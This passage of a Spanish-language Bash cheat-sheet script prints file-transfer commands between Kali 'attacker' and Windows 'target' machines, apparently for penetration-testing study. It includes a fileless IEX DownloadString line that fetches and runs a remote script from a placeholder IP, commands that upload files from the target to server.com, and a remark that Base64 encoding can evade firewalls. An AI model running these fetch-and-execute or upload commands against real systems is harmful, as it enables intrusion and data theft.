    echo "3. Aumenta el tamaño del archivo en ~33%"
    echo "4. Útil para transferir archivos por chat o correo"
}

# Función para FTP Transfers en Windows
implement_ftp_transfers() {
    echo -e "${BLUE}=== FTP Transfers en Windows ===${NC}"
    
    echo -e "${YELLOW}1. Usando PowerShell:${NC}"
    echo '$ftp = "ftp://username:password@server.com/file.exe"'
    echo '$webclient = New-Object System.Net.WebClient'
    echo '$webclient.DownloadFile($ftp, "C:\Users\Public\file.exe")'
    echo

    echo -e "${YELLOW}2. Usando comando FTP:${NC}"
    echo "ftp server.com"
    echo "username"
    echo "password"
    echo "get file.exe"
    echo "bye"
    echo

    echo -e "${YELLOW}3. Usando script FTP:${NC}"
    echo "echo open server.com > ftp.txt"
    echo "echo username >> ftp.txt"
    echo "echo password >> ftp.txt"
    echo "echo get file.exe >> ftp.txt"
    echo "echo bye >> ftp.txt"
    echo "ftp -s:ftp.txt"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. FTP envía credenciales en texto plano"
    echo "2. Considerar usar SFTP o FTPS para mayor seguridad"
    echo "3. Verificar permisos de escritura en el directorio destino"
}

# Función para Base64 en Windows
implement_base64() {
    echo -e "${BLUE}=== Base64 en Windows ===${NC}"
    
    echo -e "${YELLOW}1. Usando PowerShell:${NC}"
    echo '$content = Get-Content -Path "file.exe" -Encoding Byte'
    echo '$base64 = [Convert]::ToBase64String($content)'
    echo '$base64 | Out-File -FilePath "file.exe.b64"'
    echo

    echo -e "${YELLOW}2. Decodificar con PowerShell:${NC}"
    echo '$base64 = Get-Content -Path "file.exe.b64"'
    echo '$bytes = [Convert]::FromBase64String($base64)'
    echo '[IO.File]::WriteAllBytes("file.exe", $bytes)'
    echo

    echo -e "${YELLOW}3. Usando certutil:${NC}"
    echo "certutil -encode file.exe file.b64"
    echo "certutil -decode file.b64 file.exe"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Útil para transferir archivos binarios como texto"
    echo "2. Puede evadir algunas restricciones de firewall"
    echo "3. Aumenta el tamaño del archivo en ~33%"
}

# Función para PowerShell Web Uploads
implement_powershell_web_uploads() {
    echo -e "${BLUE}=== PowerShell Web Uploads ===${NC}"
    echo -e "${YELLOW}IMPORTANTE: Este método debe ejecutarse en la máquina objetivo${NC}"
    echo -e "${YELLOW}Descripción: Sube archivos desde la máquina objetivo hacia un servidor web${NC}"
    
    echo -e "${YELLOW}1. Usando Invoke-WebRequest:${NC}"
    echo '$filePath = "C:\Users\Public\file.exe"'
    echo '$url = "http://server.com/upload"'
    echo '$form = @{'
    echo '    file = Get-Item -Path $filePath'
    echo '}'
    echo 'Invoke-WebRequest -Uri $url -Method Post -Form $form'
    echo

    echo -e "${YELLOW}2. Usando WebClient:${NC}"
    echo '$wc = New-Object System.Net.WebClient'
    echo '$wc.UploadFile("http://server.com/upload", "C:\Users\Public\file.exe")'
    echo

    echo -e "${YELLOW}3. Usando curl.exe:${NC}"
    echo "curl.exe -F \"file=@C:\Users\Public\file.exe\" http://server.com/upload"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Verificar permisos de escritura en el servidor"
    echo "2. Considerar límites de tamaño de archivo"
    echo "3. Usar HTTPS para mayor seguridad"
}

# Función para SMB Uploads
implement_smb_uploads() {
    echo -e "${BLUE}=== SMB Uploads ===${NC}"
    
    echo -e "${YELLOW}1. Usando copy:${NC}"
    echo "copy C:\Users\Public\file.exe \\\\server\share\file.exe"
    echo

    echo -e "${YELLOW}2. Usando PowerShell:${NC}"
    echo "Copy-Item -Path 'C:\Users\Public\file.exe' -Destination '\\\\server\\share\\file.exe'"
    echo

    echo -e "${YELLOW}3. Usando net use:${NC}"
    echo "net use n: \\\\server\share /user:username password"
    echo "copy C:\Users\Public\file.exe n:\file.exe"
    echo "net use n: /delete"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Requiere permisos de escritura en el share"
    echo "2. Las nuevas versiones de Windows bloquean acceso anónimo"
    echo "3. Considerar usar credenciales válidas"
}

# Función para FTP Uploads
implement_ftp_uploads() {
    echo -e "${BLUE}=== FTP Uploads ===${NC}"
    
    echo -e "${YELLOW}1. Usando PowerShell:${NC}"
    echo '$ftp = "ftp://username:password@server.com/"'
    echo '$webclient = New-Object System.Net.WebClient'
    echo '$webclient.UploadFile($ftp, "C:\Users\Public\file.exe")'
    echo

    echo -e "${YELLOW}2. Usando comando FTP:${NC}"
    echo "ftp server.com"
    echo "username"
    echo "password"
    echo "put file.exe"
    echo "bye"
    echo

    echo -e "${YELLOW}3. Usando script FTP:${NC}"
    echo "echo open server.com > ftp.txt"
    echo "echo username >> ftp.txt"
    echo "echo password >> ftp.txt"
    echo "echo put file.exe >> ftp.txt"
    echo "echo bye >> ftp.txt"
    echo "ftp -s:ftp.txt"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. FTP envía credenciales en texto plano"
    echo "2. Verificar permisos de escritura en el servidor FTP"
    echo "3. Considerar usar SFTP o FTPS para mayor seguridad"
}

# Función para implementar Kali → Windows con Base64
implement_kali_to_windows_base64() {
    echo -e "${BLUE}=== Transferencia Kali → Windows usando Base64 ===${NC}"
    echo -e "${YELLOW}PASO 1: En Kali Linux (máquina atacante)${NC}"
    echo "1. Codificar el archivo en base64:"
    echo "base64 archivo.exe > archivo.exe.b64"
    echo
    echo -e "${YELLOW}PASO 2: En Windows (máquina objetivo)${NC}"
    echo "1. Decodificar el archivo usando PowerShell:"
    echo '$base64 = Get-Content -Path "archivo.exe.b64"'
    echo '$bytes = [Convert]::FromBase64String($base64)'
    echo '[IO.File]::WriteAllBytes("C:\\Windows\\Temp\\archivo.exe", $bytes)'
    echo
    echo -e "${YELLOW}Alternativa con certutil:${NC}"
    echo "certutil -decode archivo.exe.b64 C:\\Windows\\Temp\\archivo.exe"
}

# Función para implementar Windows → Windows con PowerShell Fileless
implement_windows_to_windows_fileless() {
    echo -e "${BLUE}=== Transferencia Windows → Windows usando PowerShell Fileless ===${NC}"
    echo -e "${YELLOW}IMPORTANTE: Este método ejecuta el script directamente en memoria${NC}"
    echo -e "${YELLOW}PASO 1: En Windows origen${NC}"
    echo "1. Crear un servidor web con el script"
    echo
    echo -e "${YELLOW}PASO 2: En Windows destino${NC}"
    echo "1. Ejecutar el script en memoria:"
    echo "IEX (New-Object Net.WebClient).DownloadString('http://<IP_WINDOWS>/script.ps1')"
    echo
    echo -e "${YELLOW}Alternativa con pipeline:${NC}"
    echo "(New-Object Net.WebClient).DownloadString('http://<IP_WINDOWS>/script.ps1') | IEX"
}

# Función para implementar Kali → Kali con Rsync
implement_kali_to_kali_rsync() {
    echo -e "${BLUE}=== Transferencia Kali → Kali usando Rsync ===${NC}"
    echo -e "${YELLOW}PASO 1: En Kali destino (receptor)${NC}"
    echo "1. Iniciar el servidor rsync:"
    echo "rsync --daemon --config=/etc/rsyncd.conf"
    echo
    echo -e "${YELLOW}PASO 2: En Kali origen (emisor)${NC}"
    echo "1. Transferir el archivo:"
    echo "rsync -avz archivo.sh <IP_KALI_DESTINO>::module/"
    echo
    echo -e "${YELLOW}Alternativa con SSH:${NC}"
    echo "rsync -avz -e ssh archivo.sh usuario@<IP_KALI_DESTINO>:/ruta/destino/"
}

# Función para implementar Windows → Kali con Base64
implement_windows_to_kali_base64() {
    echo -e "${BLUE}=== Transferencia Windows → Kali usando Base64 ===${NC}"
    echo -e "${YELLOW}PASO 1: En Windows (máquina origen)${NC}"
    echo "1. Codificar el archivo en base64:"
    echo '$content = Get-Content -Path "archivo.exe" -Encoding Byte'
    echo '$base64 = [Convert]::ToBase64String($content)'
    echo '$base64 | Out-File -FilePath "archivo.exe.b64"'
    echo
    echo -e "${YELLOW}PASO 2: En Kali Linux (máquina destino)${NC}"
    echo "1. Decodificar el archivo:"
    echo "base64 -d archivo.exe.b64 > archivo.exe"
    echo
    echo -e "${YELLOW}Alternativa con Python:${NC}"
    echo "python3 -c 'import base64; f=open(\"archivo.exe.b64\",\"r\"); data=base64.b64decode(f.read()); f.close(); f=open(\"archivo.exe\",\"wb\"); f.write(data); f.close()'"
}

# Bucle principal
while true; do
    show_menu
    read -r option

    case $option in
        1)
            while true; do
                show_kali_to_windows_menu
                read -r k2w_option

                case $k2w_option in
                    1) implement_scp ;;
                    2) implement_kali_to_windows_python_powershell ;;
                    3) implement_netcat ;;
                    4) implement_ftp_transfers ;;
                    5) implement_kali_to_windows_smb ;;
                    6) implement_kali_to_windows_base64 ;;
                    7) break ;;
                    *) echo -e "${RED}Opción inválida${NC}" ;;
                esac

                echo
                read -p "Presione Enter para continuar..."
            done
            ;;
        2)
            while true; do
                show_windows_to_windows_menu
                read -r w2w_option

                case $w2w_option in
                    1) implement_powershell_web_downloads ;;
                    2) implement_windows_to_windows_smb ;;
                    3) implement_ftp_transfers ;;
                    4) implement_alternative_methods ;;
                    5) implement_base64 ;;
                    6) implement_windows_to_windows_fileless ;;
                    7) break ;;
                    *) echo -e "${RED}Opción inválida${NC}" ;;
                esac

                echo
                read -p "Presione Enter para continuar..."
            done
            ;;
        3)
            while true; do
                show_kali_to_kali_menu
                read -r k2k_option

                case $k2k_option in
                    1) implement_scp ;;
                    2) implement_kali_to_kali_netcat ;;
                    3) implement_python ;;
                    4) implement_ftp_transfers ;;
                    5) implement_base64 ;;
                    6) implement_kali_to_kali_rsync ;;
                    7) break ;;
                    *) echo -e "${RED}Opción inválida${NC}" ;;
                esac

                echo
                read -p "Presione Enter para continuar..."
            done
            ;;
        4)
            while true; do
                show_windows_to_kali_menu
                read -r w2k_option

                case $w2k_option in
                    1) implement_windows_to_kali_powershell ;;
                    2) implement_ftp_transfers ;;
                    3) implement_netcat ;;
                    4) implement_windows_to_kali_base64 ;;
                    5) break ;;
                    *) echo -e "${RED}Opción inválida${NC}" ;;
                esac

                echo
                read -p "Presione Enter para continuar..."
            done
            ;;
        5)
            echo -e "${GREEN}Saliendo...${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}Opción inválida${NC}" ;;
    esac

    echo
    read -p "Presione Enter para continuar..."
done 
